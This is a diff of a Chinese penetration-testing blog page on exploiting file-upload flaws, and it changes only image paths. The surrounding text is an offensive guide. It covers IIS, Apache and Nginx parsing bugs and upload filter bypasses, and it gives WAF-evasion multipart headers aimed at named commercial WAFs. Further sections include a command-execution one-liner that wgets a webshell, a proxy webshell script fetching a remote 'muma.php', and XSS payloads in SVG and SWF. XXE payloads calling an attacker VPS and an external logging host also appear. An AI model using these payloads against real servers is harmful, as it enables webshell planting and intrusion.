@@ -442,16 +442,16 @@ if(request.getParameter(&quot;cat&quot;)!=null)(new java.io.FileOutputStream(app
 特殊后缀达到效果 利用ashx来生成一句话
 .htaccess 来实现后缀引导。上传jpg可以解析成脚本，具体在内容定义。</code></pre><p><strong>3   文件头验证</strong></p>
 <p>【突破方法】每次测试的时候都上传图马</p>
-<p><img src="/img/gppXml/70d624c9-7b65-490c-86bb-22c84c07d0b6.png" alt="img"></p>
+<p><img src="/img/upload/70d624c9-7b65-490c-86bb-22c84c07d0b6.png" alt="img"></p>
 <p><strong>4   文件类型验证</strong></p>
-<p><img src="/img/gppXml/a30fab0e-d8e5-4d5c-b187-7294aaf5318e.jpg" alt="img"></p>
+<p><img src="/img/upload/a30fab0e-d8e5-4d5c-b187-7294aaf5318e.jpg" alt="img"></p>
 <p><strong>5   文件后缀验证</strong></p>
 <p><em>典型的白名单验证，指定上传后缀必须为<strong>jpg</strong>、</em> <em>JPG**、</em> <em>jpeg</em> <em>、**JPEG</em></p>
-<p><img src="/img/gppXml/1a29a39a-563d-4b66-93c5-bee83bb0857b.png" alt="img"></p>
+<p><img src="/img/upload/1a29a39a-563d-4b66-93c5-bee83bb0857b.png" alt="img"></p>
 <p><strong>6    js前端验证</strong></p>
 <p>JS在前端定义了允许上传的后缀类型。</p>
 <p>【突破方法】直接在前端修改或添加后缀，找不到就搜索图片后缀 如jpg。</p>
-<p><img src="/img/gppXml/fd8cded2-211a-4d12-85d4-71bf71e86284.png" alt="img"></p>
+<p><img src="/img/upload/fd8cded2-211a-4d12-85d4-71bf71e86284.png" alt="img"></p>
 <h2 id="0x03-上传绕过姿势"><a href="#0x03-上传绕过姿势" class="headerlink" title="0x03 上传绕过姿势"></a>0x03 上传绕过姿势</h2><h3 id="0x03-1-服务器解析漏洞（IIS5-x-6-x-Apache-Nginx-IIS7-0-7-5）"><a href="#0x03-1-服务器解析漏洞（IIS5-x-6-x-Apache-Nginx-IIS7-0-7-5）" class="headerlink" title="0x03-1 服务器解析漏洞（IIS5.x-6.x  Apache  Nginx  IIS7.0/7.5）"></a>0x03-1 服务器解析漏洞（IIS5.x-6.x  Apache  Nginx  IIS7.0/7.5）</h3><h4 id="1-IIS5-x-6-x解析漏洞"><a href="#1-IIS5-x-6-x解析漏洞" class="headerlink" title="1. IIS5.x-6.x解析漏洞"></a>1. IIS5.x-6.x解析漏洞</h4><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
 <p>a. 目录解析(6.0)</p>
 <p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a><br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
@@ -460,9 +460,9 @@ if(request.getParameter(&quot;cat&quot;)!=null)(new java.io.FileOutputStream(app
 <p>c. 解析文件类型</p>
 <p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
 <p>目录解析</p>
-<p><img src="/img/gppXml/cc79f068-247e-42a8-96a8-9c44a1620666.png" alt="img"></p>
+<p><img src="/img/upload/cc79f068-247e-42a8-96a8-9c44a1620666.png" alt="img"></p>
 <p>文件解析</p>
-<p><img src="/img/gppXml/a262d5e6-d2e4-4d03-8b39-e8c2317087c3.png" alt="img"></p>
+<p><img src="/img/upload/a262d5e6-d2e4-4d03-8b39-e8c2317087c3.png" alt="img"></p>
 <h4 id="2-apache解析漏洞"><a href="#2-apache解析漏洞" class="headerlink" title="2. apache解析漏洞"></a>2. apache解析漏洞</h4><p>漏洞原理</p>
 <p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
 <p>漏洞形式</p>
@@ -470,13 +470,13 @@ if(request.getParameter(&quot;cat&quot;)!=null)(new java.io.FileOutputStream(app
 <p>其余配置问题导致漏洞</p>
 <p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
 <p>一个文件名为xxxx1.x2.x3的文件（例如：index.php.fuck）， Apache会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样一直往前尝试，直到遇到一个能解析的扩展名为止。<br>WampServer2.0AllVersion(WampServer2.0i/Apache2.2.11)<br>WampServer2.1AllVersion(WampServer2.1e-x32/Apache2.2.17)<br>Wamp5AllVersion(Wamp5_1.7.4/Apache2.2.6)<br>AppServ2.4AllVersion(AppServ-2.4.9/Apache2.0.59)<br>AppServ2.5AllVersion(AppServ-2.5.10/Apache2.2.8)<br>AppServ2.6AllVersion(AppServ-2.6.0/Apache2.2.8)<br>以上集成环境都存在扩展名解析顺序漏洞，并且这些环境都存在对php3文件按照php来解析这个小洞。该方法针对黑名单不全时，能够绕过。<br>总结存在该漏洞的Apache版本：<br>Apache2.0.x&lt;=2.0.59<br>Apache2.2.x&lt;=2.2.17</p>
-<p><img src="/img/gppXml/be1d77b3-82b8-41d8-99cc-819b5c5690cb.jpg" alt="img"></p>
+<p><img src="/img/upload/be1d77b3-82b8-41d8-99cc-819b5c5690cb.jpg" alt="img"></p>
 <h4 id="3-nginx解析漏洞"><a href="#3-nginx解析漏洞" class="headerlink" title="3. nginx解析漏洞"></a>3. nginx解析漏洞</h4><p><strong>漏洞原理</strong></p>
 <p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>
 <p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
 <p><strong>漏洞形式</strong></p>
 <p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a></p>
-<p><img src="/img/gppXml/526512546.png" alt="img"></p>
+<p><img src="/img/upload/526512546.png" alt="img"></p>
 <h4 id="4-IIS7-5解析漏洞"><a href="#4-IIS7-5解析漏洞" class="headerlink" title="4. IIS7.5解析漏洞"></a>4. IIS7.5解析漏洞</h4><p>IS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。（例如：webshell.jpg/x.php）<br>IIS7.0(Win2008R1+IIS7.0)<br>IIS7.5(Win2008R2+IIS7.5)<br>IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”任意文件名/任意文件名.php”这个漏洞其实是出现自php-cgi 的漏洞， 所以其实跟IIS自身是无关的。</p>
 <h3 id="0x03-2-文件扩展名绕过（asp-aspx-php-jsp）"><a href="#0x03-2-文件扩展名绕过（asp-aspx-php-jsp）" class="headerlink" title="0x03-2 文件扩展名绕过（asp aspx php jsp）"></a>0x03-2 文件扩展名绕过（asp aspx php jsp）</h3><h4 id="1-asp"><a href="#1-asp" class="headerlink" title="1. asp"></a>1. asp</h4><pre><code>#IIS 5.0/6.0
 #文件解析
@@ -515,7 +515,7 @@ asmx
 ------------------------------------------------------------------------------------------------------------------------------------
 #双文件上传
 ------------------------------------------------------------------------------------------------------------------------------------
-#RTLO</code></pre><p><img src="/img/gppXml/49656c3c-6604-4bea-bbea-96970c056e91.png" alt="img"></p>
+#RTLO</code></pre><p><img src="/img/upload/49656c3c-6604-4bea-bbea-96970c056e91.png" alt="img"></p>
 <h4 id="2-aspx"><a href="#2-aspx" class="headerlink" title="2. aspx"></a>2. aspx</h4><pre><code>#IIS 5.0/6.0
 文件解析
 .aspx;.jpg
@@ -662,7 +662,7 @@ Content-Type: application/octet-stream;
 Content-Disposition: form-data; name=&quot;file&quot;; filename=&#39;abc.php&#39;
 ----------WebKitFormBoundaryFADasdasdasDdasd
 Content-Disposition: form-data; name=&quot;file&quot;; filename=&#39;abc.jpg&#39;</code></pre><h4 id="3-文件内容"><a href="#3-文件内容" class="headerlink" title="3. 文件内容"></a>3. 文件内容</h4><p>传图马</p>
-<h4 id="4-双文件"><a href="#4-双文件" class="headerlink" title="4. 双文件"></a>4. 双文件</h4><p><img src="/img/gppXml/3d82e6d1-edd7-4253-80e6-d219a6e81322.png" alt="img"></p>
+<h4 id="4-双文件"><a href="#4-双文件" class="headerlink" title="4. 双文件"></a>4. 双文件</h4><p><img src="/img/upload/3d82e6d1-edd7-4253-80e6-d219a6e81322.png" alt="img"></p>
 <h3 id="0x03-4-客户端绕过"><a href="#0x03-4-客户端绕过" class="headerlink" title="0x03-4 客户端绕过"></a>0x03-4 客户端绕过</h3><p>选择一个禁止上传类型的文件上传，当点击确定按钮之后，浏览器立即弹窗提示禁止上传，一般就可以断定为客户端JavaScript检测，进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测）。</p>
 <p><strong>绕过方法</strong>：</p>
 <ul>
@@ -673,28 +673,28 @@ Content-Disposition: form-data; name=&quot;file&quot;; filename=&#39;abc.jpg&#39
 <h2 id="0x04-WAF绕过"><a href="#0x04-WAF绕过" class="headerlink" title="0x04 WAF绕过"></a>0x04 WAF绕过</h2><h3 id="0x04-1-阿里云WAF绕过"><a href="#0x04-1-阿里云WAF绕过" class="headerlink" title="0x04-1 阿里云WAF绕过"></a>0x04-1 阿里云WAF绕过</h3><pre><code>参考链接：https://www.t00ls.net/articles-51341.html
 Content-Disposition: form-data; name=&quot;upload&quot;; 
 filename===&quot;user1
-.php&quot;</code></pre><p><img src="/img/gppXml/c6d05681-15ba-4c1f-b3dd-55d34fe7f9ff.jpg" alt="img"></p>
-<p><img src="/img/gppXml/453cbfa5-c0cc-4bd8-aff6-0db0c2a755dc.jpg" alt="img"></p>
-<p><img src="/img/gppXml/727659a3-4d49-4fb7-9f0c-390f631bee93.jpg" alt="img"></p>
+.php&quot;</code></pre><p><img src="/img/upload/c6d05681-15ba-4c1f-b3dd-55d34fe7f9ff.jpg" alt="img"></p>
+<p><img src="/img/upload/453cbfa5-c0cc-4bd8-aff6-0db0c2a755dc.jpg" alt="img"></p>
+<p><img src="/img/upload/727659a3-4d49-4fb7-9f0c-390f631bee93.jpg" alt="img"></p>
 <pre><code>$x=$_get[x];`$x`
 执行xxx.com?x=wget github的php大马地址</code></pre><h3 id="0x04-2-安全狗"><a href="#0x04-2-安全狗" class="headerlink" title="0x04-2 安全狗"></a>0x04-2 安全狗</h3><pre><code>参考链接：https://www.t00ls.net/articles-51253.html
 1.===绕过
 2.去除&quot;&quot;绕过
 3.少&quot;绕过</code></pre><p><strong>===绕过</strong></p>
-<p><img src="/img/gppXml/f39eee55-1069-430c-a425-cfb2dcb4e260.jpg" alt="img"></p>
+<p><img src="/img/upload/f39eee55-1069-430c-a425-cfb2dcb4e260.jpg" alt="img"></p>
 <p><strong>去除””绕过</strong></p>
-<p><img src="/img/gppXml/ce0550f8-0aab-4e5c-81e2-2c3a0a10667c.jpg" alt="img"></p>
+<p><img src="/img/upload/ce0550f8-0aab-4e5c-81e2-2c3a0a10667c.jpg" alt="img"></p>
 <p><strong>少”绕过</strong></p>
-<p><img src="/img/gppXml/1f72a724-c7e5-431b-8d12-d7d69a319297.jpg" alt="img"></p>
-<p><img src="/img/gppXml/70170efc-7687-4bac-84e6-505299f26f75.jpg" alt="img"></p>
-<p><img src="/img/gppXml/0c713a20-bcf5-4f2f-9c1f-24abf517ea3a.jpg" alt="img"></p>
-<p><img src="/img/gppXml/73fa4d34-fe57-4920-b64c-11900e18e3d2.jpg" alt="img"><img src="/img/gppXml/2d28758f-5d93-4d3c-bd6d-665ae5dfd6b8.jpg" alt="img"></p>
+<p><img src="/img/upload/1f72a724-c7e5-431b-8d12-d7d69a319297.jpg" alt="img"></p>
+<p><img src="/img/upload/70170efc-7687-4bac-84e6-505299f26f75.jpg" alt="img"></p>
+<p><img src="/img/upload/0c713a20-bcf5-4f2f-9c1f-24abf517ea3a.jpg" alt="img"></p>
+<p><img src="/img/upload/73fa4d34-fe57-4920-b64c-11900e18e3d2.jpg" alt="img"><img src="/img/upload/2d28758f-5d93-4d3c-bd6d-665ae5dfd6b8.jpg" alt="img"></p>
 <h3 id="0x04-3-百度云"><a href="#0x04-3-百度云" class="headerlink" title="0x04-3 百度云"></a>0x04-3 百度云</h3><p><strong>文件名.php+回车，这样引号就在另一行。同时上传内容的一句话前面加个中文字符</strong></p>
-<p><img src="/img/gppXml/017328f1-29dd-4c25-9400-dc7cdba1b51d.jpg" alt="img"></p>
-<p><img src="/img/gppXml/517907359.png" alt="img"></p>
-<p><img src="/img/gppXml/517934406.png" alt="img"></p>
+<p><img src="/img/upload/017328f1-29dd-4c25-9400-dc7cdba1b51d.jpg" alt="img"></p>
+<p><img src="/img/upload/517907359.png" alt="img"></p>
+<p><img src="/img/upload/517934406.png" alt="img"></p>
 <h3 id="0x04-4-云锁"><a href="#0x04-4-云锁" class="headerlink" title="0x04-4 云锁"></a>0x04-4 云锁</h3><pre><code>Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;yjh.
-C.php&quot;</code></pre><p><img src="/img/gppXml/518023453.png" alt="img"></p>
+C.php&quot;</code></pre><p><img src="/img/upload/518023453.png" alt="img"></p>
 <h3 id="0x04-5-硬waf绕过"><a href="#0x04-5-硬waf绕过" class="headerlink" title="0x04-5 硬waf绕过"></a>0x04-5 硬waf绕过</h3><pre><code># 1. 反斜杠
 Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;yjh\.php&quot;
 # 2. form-（无数个）data
@@ -708,22 +708,22 @@ Content-Disposition: form-data; name=&quot;aaaaa&quot;
 -----------------------------30746295935112
 Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;zc.php&quot;
 # 5.垃圾数据
-filename=&#39;abc.asp&#39;;aaaaaaaaaaaaaaaaaaaaaaaa</code></pre><h2 id="0X05-实战分析"><a href="#0X05-实战分析" class="headerlink" title="0X05 实战分析"></a>0X05 实战分析</h2><h3 id="0x05-1-通过上传zip模板后服务器自解压获取webshell"><a href="#0x05-1-通过上传zip模板后服务器自解压获取webshell" class="headerlink" title="0x05-1 通过上传zip模板后服务器自解压获取webshell"></a>0x05-1 通过上传zip模板后服务器自解压获取webshell</h3><p><img src="/img/gppXml/518531000.png" alt="img"></p>
-<p><img src="/img/gppXml/9aa43dbb-7774-4dfb-a733-abb7f0a11764.png" alt="img"></p>
-<p><img src="/img/gppXml/a4b7b96d-6556-460e-ad23-4c74dd3dee4f.png" alt="img"></p>
-<p><img src="/img/gppXml/518544781.png" alt="img"></p>
+filename=&#39;abc.asp&#39;;aaaaaaaaaaaaaaaaaaaaaaaa</code></pre><h2 id="0X05-实战分析"><a href="#0X05-实战分析" class="headerlink" title="0X05 实战分析"></a>0X05 实战分析</h2><h3 id="0x05-1-通过上传zip模板后服务器自解压获取webshell"><a href="#0x05-1-通过上传zip模板后服务器自解压获取webshell" class="headerlink" title="0x05-1 通过上传zip模板后服务器自解压获取webshell"></a>0x05-1 通过上传zip模板后服务器自解压获取webshell</h3><p><img src="/img/upload/518531000.png" alt="img"></p>
+<p><img src="/img/upload/9aa43dbb-7774-4dfb-a733-abb7f0a11764.png" alt="img"></p>
+<p><img src="/img/upload/a4b7b96d-6556-460e-ad23-4c74dd3dee4f.png" alt="img"></p>
+<p><img src="/img/upload/518544781.png" alt="img"></p>
 <p>那么在10000003目录下，就会有我们的大马和一句话木马。</p>
-<h3 id="0x05-2-黑名单绕过之文件名可控"><a href="#0x05-2-黑名单绕过之文件名可控" class="headerlink" title="0x05-2 黑名单绕过之文件名可控"></a>0x05-2 黑名单绕过之文件名可控</h3><p><img src="/img/gppXml/523227109.png" alt="img"></p>
-<p><img src="/img/gppXml/523240234.png" alt="img"></p>
-<p><img src="/img/gppXml/523263781.png" alt="img"></p>
-<p><img src="/img/gppXml/523290500.png" alt="img"></p>
-<h3 id="0x05-3-高并发绕过上传总结-条件竞争"><a href="#0x05-3-高并发绕过上传总结-条件竞争" class="headerlink" title="0x05-3 高并发绕过上传总结(条件竞争)"></a>0x05-3 高并发绕过上传总结(条件竞争)</h3><p><img src="/img/gppXml/e0e5a176-e02f-401e-80da-76f981ae0c37.jpg" alt="img"></p>
+<h3 id="0x05-2-黑名单绕过之文件名可控"><a href="#0x05-2-黑名单绕过之文件名可控" class="headerlink" title="0x05-2 黑名单绕过之文件名可控"></a>0x05-2 黑名单绕过之文件名可控</h3><p><img src="/img/upload/523227109.png" alt="img"></p>
+<p><img src="/img/upload/523240234.png" alt="img"></p>
+<p><img src="/img/upload/523263781.png" alt="img"></p>
+<p><img src="/img/upload/523290500.png" alt="img"></p>
+<h3 id="0x05-3-高并发绕过上传总结-条件竞争"><a href="#0x05-3-高并发绕过上传总结-条件竞争" class="headerlink" title="0x05-3 高并发绕过上传总结(条件竞争)"></a>0x05-3 高并发绕过上传总结(条件竞争)</h3><p><img src="/img/upload/e0e5a176-e02f-401e-80da-76f981ae0c37.jpg" alt="img"></p>
 <p>2、但是上传后会变成asp_.jpg    php_.jpg    jsp_.jpg</p>
 <p>转折点是前面的命名是以时间命名，文件名是 年月日时分秒到毫秒这种规律来定义的，那么尝试高并发上传</p>
 <p>如果文件名相同会怎么样？报错？还是说服务器不会把%00转换为下划线，而是先重命名为xxxxxxxxxxx(1).asp。</p>
 <p>经过测试发现服务器先重命名为(1).asp了，而不会把%00转换为下划线了。</p>
-<p><img src="/img/gppXml/36b64bad-0046-49f6-974e-4f1b8fbb04af.jpg" alt="img"></p>
-<p><img src="/img/gppXml/3ed98cbb-4056-4d5f-991c-a9697d36d444.jpg" alt="img"></p>
+<p><img src="/img/upload/36b64bad-0046-49f6-974e-4f1b8fbb04af.jpg" alt="img"></p>
+<p><img src="/img/upload/3ed98cbb-4056-4d5f-991c-a9697d36d444.jpg" alt="img"></p>
 <p>3、这样就成功上传了！然后上传图片马，用shtml去包含图片马路径即可拿到 shell，或者上传免杀的asp马</p>
 <h2 id="0x06-upload-labs过关"><a href="#0x06-upload-labs过关" class="headerlink" title="0x06 upload-labs过关"></a>0x06 upload-labs过关</h2><p>1、前端</p>
 <p>2、修改content-type为image/gif</p>
@@ -765,7 +765,7 @@ $code = $_POST[code];
 fwrite($bypassFile,$code );
 fclose($bypassFile);
 print(file_get_contents(&quot;http://a.com/muma.php&quot;));</code></pre><p>菜刀 直接连b.com/l.php 连上去后控制的是a.com</p>
-<p><img src="/img/gppXml/97b693c7-146f-4176-b4f1-337e7ce088a1.png" alt="img"></p>
+<p><img src="/img/upload/97b693c7-146f-4176-b4f1-337e7ce088a1.png" alt="img"></p>
 <h2 id="0x08-造洞"><a href="#0x08-造洞" class="headerlink" title="0x08 造洞"></a>0x08 造洞</h2><pre><code>文件上传漏洞：↓
     html文件：造出一个xss漏洞
     swf文件：造出一个xss漏洞
@@ -777,22 +777,22 @@ print(file_get_contents(&quot;http://a.com/muma.php&quot;));</code></pre><p>菜�
     shtml文件：ssi命令执行
     xlsx: xxe漏洞
     xml文件：xxe，xss漏洞</code></pre><h3 id="0x08-1-svg文件"><a href="#0x08-1-svg文件" class="headerlink" title="0x08-1 svg文件"></a>0x08-1 svg文件</h3><pre><code># 1.svg
-&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(1)&quot;/&gt;</code></pre><p><img src="/img/gppXml/2d6e940c-1e60-4304-9c6e-5cbe1f292cca.png" alt="img"></p>
-<h3 id="0x08-2-swf文件"><a href="#0x08-2-swf文件" class="headerlink" title="0x08-2 swf文件"></a>0x08-2 swf文件</h3><pre><code>http://127.0.0.1/swfupload.swf?movieName=&quot;]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28&quot;xss&quot;%29}}//</code></pre><p><img src="/img/gppXml/d08b2546-6c46-4f38-aa86-0a21fdd46ac3.png" alt="img"></p>
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(1)&quot;/&gt;</code></pre><p><img src="/img/upload/2d6e940c-1e60-4304-9c6e-5cbe1f292cca.png" alt="img"></p>
+<h3 id="0x08-2-swf文件"><a href="#0x08-2-swf文件" class="headerlink" title="0x08-2 swf文件"></a>0x08-2 swf文件</h3><pre><code>http://127.0.0.1/swfupload.swf?movieName=&quot;]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28&quot;xss&quot;%29}}//</code></pre><p><img src="/img/upload/d08b2546-6c46-4f38-aa86-0a21fdd46ac3.png" alt="img"></p>
 <h3 id="0x08-3-任意文件后缀，只要内容是xxe内容"><a href="#0x08-3-任意文件后缀，只要内容是xxe内容" class="headerlink" title="0x08-3 任意文件后缀，只要内容是xxe内容"></a>0x08-3 任意文件后缀，只要内容是xxe内容</h3><pre><code>XXE代码 ：
 #EXTM3U
 #EXT-X-MEDIA-SEQUENCE:0
 #EXTINF:10.0,
 concat:http://VPS_IP:VPS_PORT/header.m3u8
 #EXT-X-ENDLIST</code></pre><p><strong>读取文件payload</strong></p>
-<p><img src="/img/gppXml/c78a30ca-3699-415b-a3da-aea2d6daf6b3.png" alt="img"></p>
-<pre><code>nc –lvp  8080</code></pre><p><img src="/img/gppXml/25812427-4388-445b-831b-6724f944fe4b.jpg" alt="img"></p>
+<p><img src="/img/upload/c78a30ca-3699-415b-a3da-aea2d6daf6b3.png" alt="img"></p>
+<pre><code>nc –lvp  8080</code></pre><p><img src="/img/upload/25812427-4388-445b-831b-6724f944fe4b.jpg" alt="img"></p>
 <h3 id="0x08-4-shtml文件-ssi命令执行"><a href="#0x08-4-shtml文件-ssi命令执行" class="headerlink" title="0x08-4 shtml文件 ssi命令执行"></a>0x08-4 shtml文件 ssi命令执行</h3><pre><code>&lt;!--#ECHO var=&quot;SERVER_SOFTWARE&quot;--&gt;
 &lt;!--#echo var=&quot;server_name&quot; --&gt;
 &lt;!--#echo var=&quot;remote_user&quot; --&gt;
-命令参考链接：https://www.secpulse.com/archives/66934.html</code></pre><p><img src="/img/gppXml/1cea9bcc-4b86-401c-a25a-05b1779ef97e.png" alt="img"></p>
+命令参考链接：https://www.secpulse.com/archives/66934.html</code></pre><p><img src="/img/upload/1cea9bcc-4b86-401c-a25a-05b1779ef97e.png" alt="img"></p>
 <p>执行了命令</p>
-<p><img src="/img/gppXml/47257796.png" alt="img"></p>
+<p><img src="/img/upload/47257796.png" alt="img"></p>
 <h3 id="0x08-5-xlsx文件-XXE"><a href="#0x08-5-xlsx文件-XXE" class="headerlink" title="0x08-5 xlsx文件 XXE"></a>0x08-5 xlsx文件 XXE</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &#39;http://xxe.xxxxx.ceye.io&#39;&gt;%remote;]&gt;&lt;root/&gt;
 Xlsx文件构造：
 1、 新建一个xlsx文件
